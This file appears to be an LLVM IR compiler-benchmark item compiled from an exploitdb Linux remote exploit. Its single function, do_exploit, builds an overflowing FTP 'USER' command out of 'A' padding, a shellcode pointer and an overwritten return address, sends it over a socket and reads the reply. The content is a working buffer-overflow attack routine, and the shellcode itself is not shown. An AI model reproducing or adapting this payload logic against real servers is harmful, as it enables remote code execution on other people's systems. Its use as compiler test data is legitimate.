; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1813.c_do_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1813.c_do_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"USER %s%s%s\0D\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @do_exploit(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [360 x i8], align 16
  %6 = alloca [100 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [30 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %9 = getelementptr inbounds [360 x i8], [360 x i8]* %5, i64 0, i64 0
  %10 = call i32 @memset(i8* %9, i8 signext 0, i32 360)
  %11 = getelementptr inbounds [360 x i8], [360 x i8]* %5, i64 0, i64 0
  %12 = call i32 @memset(i8* %11, i8 signext 65, i32 352)
  %13 = getelementptr inbounds [100 x i8], [100 x i8]* %6, i64 0, i64 0
  %14 = call i32 @memset(i8* %13, i8 signext 0, i32 100)
  %15 = getelementptr inbounds [100 x i8], [100 x i8]* %6, i64 0, i64 0
  %16 = call i32 @memset(i8* %15, i8 signext 65, i32 90)
  br label %17

17:                                               ; preds = %2, %31
  %18 = load i32, i32* %3, align 4
  %19 = getelementptr inbounds [30 x i8], [30 x i8]* %8, i64 0, i64 0
  %20 = call i32 @recv(i32 %18, i8* %19, i32 1, i32 0)
  %21 = getelementptr inbounds [30 x i8], [30 x i8]* %8, i64 0, i64 0
  %22 = load i8, i8* %21, align 16
  %23 = sext i8 %22 to i32
  %24 = icmp eq i32 %23, 13
  br i1 %24, label %30, label %25

25:                                               ; preds = %17
  %26 = getelementptr inbounds [30 x i8], [30 x i8]* %8, i64 0, i64 0
  %27 = load i8, i8* %26, align 16
  %28 = sext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  br i1 %29, label %30, label %31

30:                                               ; preds = %25, %17
  br label %32

31:                                               ; preds = %25
  br label %17

32:                                               ; preds = %30
  %33 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %34 = getelementptr inbounds [360 x i8], [360 x i8]* %5, i64 0, i64 0
  %35 = load i8*, i8** @shellcode, align 8
  %36 = getelementptr inbounds [100 x i8], [100 x i8]* %6, i64 0, i64 0
  %37 = call i32 @sprintf(i8* %33, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i8* %34, i8* %35, i8* %36)
  %38 = load i32, i32* %4, align 4
  %39 = lshr i32 %38, 24
  %40 = and i32 %39, 255
  %41 = trunc i32 %40 to i8
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %43 = call i32 @strlen(i8* %42)
  %44 = sub nsw i32 %43, 1
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %45
  store i8 %41, i8* %46, align 1
  %47 = load i32, i32* %4, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 255
  %50 = trunc i32 %49 to i8
  %51 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %52 = call i32 @strlen(i8* %51)
  %53 = sub nsw i32 %52, 2
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %54
  store i8 %50, i8* %55, align 1
  %56 = load i32, i32* %4, align 4
  %57 = lshr i32 %56, 8
  %58 = and i32 %57, 255
  %59 = trunc i32 %58 to i8
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %61 = call i32 @strlen(i8* %60)
  %62 = sub nsw i32 %61, 3
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %63
  store i8 %59, i8* %64, align 1
  %65 = load i32, i32* %4, align 4
  %66 = and i32 %65, 255
  %67 = trunc i32 %66 to i8
  %68 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %69 = call i32 @strlen(i8* %68)
  %70 = sub nsw i32 %69, 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %71
  store i8 %67, i8* %72, align 1
  %73 = load i32, i32* %3, align 4
  %74 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %75 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %76 = call i32 @strlen(i8* %75)
  %77 = call i32 @send(i32 %73, i8* %74, i32 %76, i32 0)
  %78 = load i32, i32* %3, align 4
  %79 = getelementptr inbounds [30 x i8], [30 x i8]* %8, i64 0, i64 0
  %80 = call i32 @recv(i32 %78, i8* %79, i32 29, i32 0)
  ret void
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
